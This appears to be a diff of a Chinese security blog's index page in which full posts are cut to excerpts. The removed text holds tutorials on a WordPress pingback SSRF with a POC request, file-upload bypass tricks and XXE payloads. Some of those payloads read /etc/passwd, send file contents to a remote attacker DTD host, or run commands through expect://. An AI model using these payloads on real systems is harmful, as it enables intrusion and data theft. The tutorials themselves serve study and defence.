@@ -255,31 +255,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。</p>
-<h2 id="ip地址的几种表示方式"><a href="#ip地址的几种表示方式" class="headerlink" title="ip地址的几种表示方式"></a>ip地址的几种表示方式</h2><p>ip地址域名有多种表示方式，浏览器都能识别出来。</p>
-<ol>
-<li>常见的ip地址域名表示方法<br><ul>
-<li>点分十进制表示法，例如192.168.1.2<br></li>
-<li>二进制表示法例如11000000101010000000000100000010，表示192.168.1.2</li>
-</ul>
-</li>
-<li>非常见ip地址域名表示方法<br><ul>
-<li>整数型：将上述的二进制直接转换成整数3232235778，浏览器通过访问<a href="http://3232235778" target="_blank" rel="external">http://3232235778</a> 解析为192.168.1.2，除此之外还可以通过公式<code>192*256^3+168*256^2+1*256+2=3232235778</code>换算<br></li>
-<li>八进制型：将IP 192.168.1.2换成8进制0300.0250.01.02，在前面加上0表示8进制<br></li>
-<li>十六进制型：将IP 192.168.1.2换成16进制0xc0.0xA8.1.2，在前面加上0x表示16进制<br></li>
-<li>混合型：即以上的几种方式的结合，0300.0xA8.1.0x02<br></li>
-</ul>
-</li>
-</ol>
-<p>下面就是通过八进制绕过检测。</p>
-<h2 id="代码详情"><a href="#代码详情" class="headerlink" title="代码详情"></a>代码详情</h2><p>漏洞成因处508 <code>wp_http_validate_url</code> 函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( ! $same_host ) &#123;</span><br><span class="line">		$host = trim( $parsed_url[<span class="string">'host'</span>], <span class="string">'.'</span> );</span><br><span class="line">		<span class="keyword">if</span> ( preg_match( <span class="string">'#^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$#'</span>, $host ) ) &#123;</span><br><span class="line">			$ip = $host;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$ip = gethostbyname( $host );</span><br><span class="line">			<span class="keyword">if</span> ( $ip === $host ) <span class="comment">// Error condition for gethostbyname()</span></span><br><span class="line">				$ip = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ( $ip ) &#123;</span><br><span class="line">			$parts = array_map( <span class="string">'intval'</span>, explode( <span class="string">'.'</span>, $ip ) );</span><br><span class="line">			<span class="keyword">if</span> ( <span class="number">127</span> === $parts[<span class="number">0</span>] || <span class="number">10</span> === $parts[<span class="number">0</span>] || <span class="number">0</span> === $parts[<span class="number">0</span>]</span><br><span class="line">				|| ( <span class="number">172</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">16</span> &lt;= $parts[<span class="number">1</span>] &amp;&amp; <span class="number">31</span> &gt;= $parts[<span class="number">1</span>] )</span><br><span class="line">				|| ( <span class="number">192</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">168</span> === $parts[<span class="number">1</span>] )</span><br><span class="line">			) &#123;</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure></p>
-<p>这里的代码通过正则表达式<code>^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$</code>判断ip是否合法，如果不合法则通过网络获取ip的值。<br><br>下面的if判断则是用来防止给的url为内网ip，但是上述的正则表达式可以通过8进制绕过内网限制。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $parsed_url[<span class="string">'port'</span>] ) )</span><br><span class="line">		<span class="keyword">return</span> $url;</span><br><span class="line"></span><br><span class="line">	$port = $parsed_url[<span class="string">'port'</span>];</span><br><span class="line">	<span class="keyword">if</span> ( <span class="number">80</span> === $port || <span class="number">443</span> === $port || <span class="number">8080</span> === $port )</span><br><span class="line">		<span class="keyword">return</span> $url;</span><br></pre></td></tr></table></figure></p>
-<p>再接下来可以看到程序又对端口做了限制，只能扫描80,443,8080端口。<br><br>综上所述，通过8进制绕过ip判断，可以扫描内网的80,443,8080<br><br>找一下调用的位置,可以找到class-wp-xmlrpc-server.php通过wp_safe_remote_get调用了get函数，get函数使用了wp_http_validate_url，从而造成ssrf</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>利用的方式为通过xmlrpc.php中pingback.ping功能来调用这个函数。<br>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 321</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这里设置10.10.10.111为受害者<br><img src="http://blog.0kami.cn/img/wordpress-ssrf.png" alt="image"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在测试中发现只能对10.x.x.x的内网ip进行利用，因为正则的原因至多只能有3位数字，一位需要为0来表示8进制，所以利用只有10,并且只能扫描80,443,8080端口。由于利用中不回显，也很难确定是否成功利用。所以这个洞可能危害比较小（太菜了，想不到其他的利用方式，有其他的利用方式记得分享啊！！！）<br>还有一种利用就是开启xmlrpc的wordpress站可以被通过pingback.ping方法来DDOS，这个以前就有人提出来了。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://xlab.baidu.com/wordpress/" target="_blank" rel="external">http://xlab.baidu.com/wordpress/</a><br><a href="https://virusdefender.net/index.php/archives/733/" target="_blank" rel="external">https://virusdefender.net/index.php/archives/733/</a></p>
-
+              <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。<br>
+          
       
     </div>
     
@@ -296,6 +273,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webVul/">webVul</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/08/19/wordpress-ssrf-4-4-2/#more">more&gt;&gt; >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -340,63 +321,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>这几天空下来根据<a href="http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf" target="_blank" rel="external">上传攻击框架</a>学习总结一下上传攻击。</p>
-<h2 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h2><p>1.客户端javascript检测（检测文件扩展名为主）<br>2.服务端MIME类型检测（检测Content-type内容）<br>3.服务端目录路劲检测（检测跟path相关的内容）<br>4.服务端文件扩展名检测（检测跟文件后缀相关的内容）<br>5.服务端文件内容检测（检测内容是否合法或含有恶意代码）</p>
-<h2 id="客户端javascript检测"><a href="#客户端javascript检测" class="headerlink" title="客户端javascript检测"></a>客户端javascript检测</h2><p>通常此类检测会在js文件中有一个检测的函数，一般对上传的文件后缀名做检测，例如仅允许上传png,jpg,gif等类型的文件，如果检测到的文件后缀名不是在这些名单内，则不向服务器端传输文件内容。<br>这类检测也是最容易绕过的检测，可以使用firebug之类的插件把它禁掉或者通过burp之类的代理工具进行绕过提交。<br>使用burp，上传时提供一个白名单内的后缀，通过burp拦包，并修改后缀后提交</p>
-<h2 id="服务端检测绕过（MIME类型检测）"><a href="#服务端检测绕过（MIME类型检测）" class="headerlink" title="服务端检测绕过（MIME类型检测）"></a>服务端检测绕过（MIME类型检测）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>) &#123; <span class="comment">//检测Content-type</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	$uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">	$uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">	<span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], $uploadfile)) 	  &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上面为php后端检测MIME类型的一个例子<br>通过判断<code>$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;</code>来保证上传的类型为gif类型的文件。<br>绕过这一类型的检测，可以通过burp拦包，将原<code>Content-Type</code>类型该为符合要求的<code>image/gif</code>类型。</p>
-<h2 id="服务端检测绕过（目录路劲检测）"><a href="#服务端检测绕过（目录路劲检测）" class="headerlink" title="服务端检测绕过（目录路劲检测）"></a>服务端检测绕过（目录路劲检测）</h2><p>有一些web应用程序有多个文件夹用来存储图片文件，所以为了标识上传的图片是属于哪个文件夹的，上传文件时会带上文件存储路劲。而此时如果对文件目录路劲检测不够完全，可以通过截断攻击。（如%00,windows下%80-%90）<br>如上传时提供存储路劲为<code>image/20160704/</code>可以通过修改为<code>image/20160704/evil.php%00</code>来达到截断目的。后端程序会将该路劲连接为<code>image/20160704/evil.php%00filename.gif</code>00截断导致最终存储的文件名为evil.php</p>
-<h2 id="服务器端检测绕过（文件扩展名检测）"><a href="#服务器端检测绕过（文件扩展名检测）" class="headerlink" title="服务器端检测绕过（文件扩展名检测）"></a>服务器端检测绕过（文件扩展名检测）</h2><p>1.黑名单检测<br>黑名单检测通常会有一个文件后缀名黑名单（例如html|htm|php|php2|php3|php4|php5…）<br>但是通常黑名单检测不能包含所有的恶意脚本后缀，防护难度会比较大，推荐使用白名单<br>绕过的方法：</p>
-<ul>
-<li>文件名大小写绕过（例如用Php，Asp等）</li>
-<li>名单列表绕过(用黑名单中未提及的文件后缀来绕过，如asa，cer等不常见的文件后缀)</li>
-<li>特殊文件名绕过（只适用windows，将文件名改为evil.php.或evil.php (注意这里有一个空格),在windows下，不允许这样的命名，所以会将.和空格自动去掉）</li>
-<li>0x00截断（asp下可以尝试使用,asp为从后往前扫描扩展名，<code>evil.asp%00.jpg</code>，会被识别为jpg，只要检测方式如这种可以通过这种方式绕过）</li>
-<li>.htaccess文件攻击（配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测）<h4 id="htaccess文件攻击"><a href="#htaccess文件攻击" class="headerlink" title=".htaccess文件攻击"></a>.htaccess文件攻击</h4>如果黑名单中未包含.htaccess后缀的可以通过重写解析配置来达到解析的效果<br>针对php，上传自定义.htaccess<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;haha&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>同目录有个我们上传一个只有文件名并包含字符串”haha”，但是却无任何扩展名的文件<br>里面的内容是 php 一句话木马，通过菜刀连接可以解析php<br>成因：<br>    在 PHP manual 中提到了下面一段话<br>    move_uploaded_file section, there is a warning which states ‘If the destination file already exists, it will be overwritten.’<br>    如果 PHP 安全没配置好<br>    就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的<br>    这样就能任意定义解析名单了</p>
-<ul>
-<li>解析漏洞（apache解析漏洞，iis6.0解析漏洞，nginx解析漏洞）<h4 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h4>apache是从右到左开始判断解析，如果最右的后缀无法解析，则尝试解析后一个后缀<h4 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h4></li>
-<li>成因为iis6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型</li>
-<li>还有一个为IIS6.0的00截断攻击</li>
-<li>IIS6.0双文件上传</li>
-<li>文件夹的名字包含<code>.asp</code>则这个文件夹下的文件都以asp的形式来解析<h4 id="iis7-0-7-5解析漏洞"><a href="#iis7-0-7-5解析漏洞" class="headerlink" title="iis7.0/7.5解析漏洞"></a>iis7.0/7.5解析漏洞</h4>对于php有一个类似Nginx的解析漏洞<code>evil.jpg/evil.php</code> 解析evil.jpg中的php代码，这个漏洞成因在于php-cgi的漏洞<h4 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h4></li>
-<li>将php文件换成其他可以通过的文件后缀，访问的时候在后面加上/.php，即evil.jpg/.php，evil.jpg会解析为php的格式</li>
-<li>%00截断</li>
-<li>其他方式<br>提交前将filename=”evil.php”该为”evil.php”.jpg”</li>
-</ul>
-<p>2.白名单检测</p>
-<ul>
-<li>0x00截断绕过</li>
-<li>解析漏洞绕过（文件名不被重写）</li>
-</ul>
-<h2 id="服务器端检测绕过（文件内容检测）"><a href="#服务器端检测绕过（文件内容检测）" class="headerlink" title="服务器端检测绕过（文件内容检测）"></a>服务器端检测绕过（文件内容检测）</h2><p>图像类的文件内容检测</p>
-<ul>
-<li>文件幻数检测（图片头格式检测）<br>jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46<br>gif内容头value= 47 49 46 38 39 61<br>png内容头value= 89 50 4E 47<br>在文件头后加上一句话木马就能绕过</li>
-<li><p>文件相关信息检测<br>图像文件相关信息检测常用的就是php的getimagesize()函数，可以通过修改图片的注释区（data区）插入一句话代码，如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>文件加载检测<br>调用API或函数去进行文件加载测试，常见的是图像渲染测试，二次渲染，可以通过上传恶意文件，再下载下来，diff一下找到不变的位置插入一句话木马，但成功率不高</p>
-</li>
-</ul>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
-<li>轻量级检测绕过攻击<ul>
-<li>绕过 javascript 对扩展名的检测<br>&lt;用 burp 之类的反向代理工具直接 POST 数据包到服务端，绕过前端检测&gt;</li>
-<li>绕过服务端对 http request 包 MIME 类型检测<br>&lt;用 burp 之类的反向代理工具伪造 POST 数据包到服务端，绕过 MIME 检测&gt;</li>
-</ul>
-</li>
-<li>路径/扩展名检测绕过攻击<ul>
-<li>黑名单绕过<br>文件名大小写绕过<br>名单列表绕过<br>特殊文件名绕过<br>0x00 截断绕过<br>.htaccess 文件攻击<br>本地包含漏洞<br>Apache 解析漏洞<br>IIS 解析漏洞<br>Nginx 解析漏洞</li>
-<li>白名单绕过<br>0x00 截断绕过<br>本地文件包含漏洞<br>IIS 解析漏洞<br>Nginx 解析漏洞</li>
-</ul>
-</li>
-<li>文件内容检测绕过攻击<ul>
-<li>文件加载测试绕过<br>&lt;对文件进行代码注入再配合任意解析调用/漏洞&gt;</li>
-</ul>
-</li>
-</ol>
-
+              <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>这几天空下来根据<a href="http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf">上传攻击框架</a>学习总结一下上传攻击。<br>
+          
       
     </div>
     
@@ -413,6 +339,10 @@
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webVul/">webVul</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/07/04/file-upload-vul/#more">more&gt;&gt; >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -457,83 +387,8 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x00-描述"><a href="#0x00-描述" class="headerlink" title="0x00 描述"></a>0x00 描述</h2><p>XML的一些基础知识，摘自<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">security.tencent.com</a><br>XML例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span>  xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[   文档类型定义</span><br><span class="line">	&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">	&lt;!ELEMENT to   (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT from   (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT heading   (#PCDATA)&gt;</span><br><span class="line">	&lt;!ELEMENT body   (#PCDATA)&gt;</span><br><span class="line">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> 文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>This is a Test<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>上述为一个XML的实例<br>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
-<h5 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h5><p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
-<h5 id="引用外部DTD"><a href="#引用外部DTD" class="headerlink" title="引用外部DTD"></a>引用外部DTD</h5><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>或者<code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code><br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
-<h5 id="内部声明实体"><a href="#内部声明实体" class="headerlink" title="内部声明实体"></a>内部声明实体</h5><p><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p>
-<h5 id="引用外部实体"><a href="#引用外部实体" class="headerlink" title="引用外部实体"></a>引用外部实体</h5><p><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>或者<code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p>
-<h5 id="漏洞描述摘自OWASP"><a href="#漏洞描述摘自OWASP" class="headerlink" title="漏洞描述摘自OWASP"></a>漏洞描述摘自<a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank" rel="external">OWASP</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.</span><br></pre></td></tr></table></figure>
-<p>漏洞成因为XML解析器配置不安全时，当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
-<h2 id="0x01-试验"><a href="#0x01-试验" class="headerlink" title="0x01 试验"></a>0x01 试验</h2><p>恶意引入外部实体方式：<br>1.本地文件读取<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span><br><span class="line">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>2.远程文件读取<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY % d SYSTEM "http://evil.com/evil.dtd"&gt;</span><br><span class="line">	%d;</span><br><span class="line">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br><span class="line">其中evil.dtd文件内容</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>但是如果遇到读取多行的文件，可能会读不出来，这里可以看一下<a href="http://zone.wooyun.org/content/26651" target="_blank" rel="external">ftp接受xxe数据</a><br>不同的语言默认支持的协议不同</p>
-<table>
-<thead>
-<tr>
-<th>libxml2</th>
-<th>php</th>
-<th>java</th>
-<th>.net</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>file<br>http<br>ftp</td>
-<td>file<br>http<br>ftp<br>php<br>compress.zip<br>compress.bzip2<br>data<br>glob<br>phar</td>
-<td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td>
-<td>http<br>file<br>https<br>ftp</td>
-</tr>
-</tbody>
-</table>
-<p>上述为默认支持协议，还可以通过扩展支持其他协议，如php</p>
-<table>
-<thead>
-<tr>
-<th>scheme</th>
-<th>extension required</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>https<br>ftps</td>
-<td>openssl</td>
-</tr>
-<tr>
-<td>zip</td>
-<td>zip</td>
-</tr>
-<tr>
-<td>ssh2.shell<br>ssh2.exec<br>ssh2.tunnel<br>ssh2.sftp<br>ssh2.scp</td>
-<td>ssh2</td>
-</tr>
-<tr>
-<td>rar</td>
-<td>rar</td>
-</tr>
-<tr>
-<td>ogg</td>
-<td>oggvorbis</td>
-</tr>
-<tr>
-<td>expect</td>
-<td>expect</td>
-</tr>
-</tbody>
-</table>
-<h5 id="demo1-任意读取本地文件"><a href="#demo1-任意读取本地文件" class="headerlink" title="demo1 任意读取本地文件"></a>demo1 任意读取本地文件</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
-<h5 id="demo2-不回显读取内容，远程传递数据"><a href="#demo2-不回显读取内容，远程传递数据" class="headerlink" title="demo2 不回显读取内容，远程传递数据"></a>demo2 不回显读取内容，远程传递数据</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/issue"&gt;</span><br><span class="line">	&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt;</span><br><span class="line">	%dtd;</span><br><span class="line">	%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">远程DTD文件内容</span><br><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;"</span>&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
-<h5 id="demo3-执行系统命令"><a href="#demo3-执行系统命令" class="headerlink" title="demo3 执行系统命令"></a>demo3 执行系统命令</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version="1.0"?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY b SYSTEM "expect://id"&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br><span class="line">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
